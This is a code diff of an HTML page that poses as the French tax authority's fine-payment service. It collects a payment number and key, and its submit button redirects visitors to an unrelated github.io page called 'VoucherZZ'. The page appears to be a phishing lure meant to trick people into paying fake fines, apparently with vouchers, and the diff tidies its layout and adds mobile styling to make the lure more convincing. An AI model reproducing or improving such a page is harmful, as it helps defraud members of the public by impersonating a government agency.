@@ -6,26 +6,17 @@
     <title>Service de paiement des amendes</title>
     <style>
         body {
-            font-fami<!DOCTYPE html>
-<html lang="fr">
-
-<body>
-   
-  <a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a>" 
-   
- 
-    </div>
-</body>
-</html>
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
             text-align: center;
         }
-
         .header {
             width: 100%;
-            heig<body>
-ht: 50vh;
+            height: 50vh;
             display: flex;
             justify-content: center;
+            align-items: center;
             background-color: #f4f4f4;
         }
         .header img {
@@ -33,55 +24,81 @@ ht: 50vh;
             max-height: 100%;
             object-fit: contain;
         }
-          
-         .button-zone button {
+        .content {
+            padding: 20px;
+        }
+        .form-container {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: left;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        .button-zone button {
             background-color: #007BFF;
             color: white;
             border: none;
-            padding: 12px 65px;
+            padding: 12px 35px;
             font-size: 16px;
             border-radius: 4px;
             cursor: pointer;
-      
-      }
+            width: 90%;
+        }
+        .footer-copyright {
+            margin-top: 20px;
+            text-align: center;
+        }
+        @media (max-width: 768px) {
+            .header {
+                height: auto;
+            }
+            .header img {
+                max-height: 30vh;
+            }
+            .button-zone button {
+                padding: 12px 30px;
+            }
+        }
     </style>
 </head>
-
 <body>
+    <div class="header">
+        <a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a>
+    </div>
 
-               
-   
-         <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg"" alt="e" border="0" /></a>
-    </div>                          
+    <div class="content">
+        <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" border="0" /></a></center>
 
- 
-        </a>
-         <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" border="0" /></a>
-    </div>                          
+        <center><div class="form-container">
+            <h2>Saisie du numéro de télépaiement</h2>
+            <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
+                <div class="input-group">
+                    <label for="numeroTelepaiement">Numéro de télépaiement :</label>
+                    <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
+                </div>
+                <div class="input-group">
+                    <label for="cle">Clé :</label>
+                    <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
+                </div>
+                <center><div class="button-zone">
+                    <button type="submit">Payer</button>
+                </div>
+            </form>
+        </div>
+    </div>
 
-
-     <center><div class="form-container">
-        <h2>Saisie du numéro de télépaiement</h2>
-          <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
-            <div class="input-group">
-                <label for="numeroTelepaiement">Numéro de télépaiement :</label>
-                <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
-                                         <p>
-            </div>
-            <div class="input-group">
-                <label for="cle">Clé :</label>
-                <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
-                                                  <p>                               
-            </div>
-            <div class="button-zone">
-                <button type="submit">Payer</button>
-            </div>
-        </form>
-          
-                  
-             <p><p><p><div class="footer-copyright"><p> © Direction générale des Finances publiques - <a id="mention-legales" class="xt" href="/tai/mention-legales">Mentions légales</a></p></div>                             
-                                     
-                                     
+    <div class="footer-copyright">
+        <p>© Direction générale des Finances publiques - <a id="mention-legales" class="xt" href="/tai/mention-legales">Mentions légales</a></p>
     </div>
 </body>
 </html>
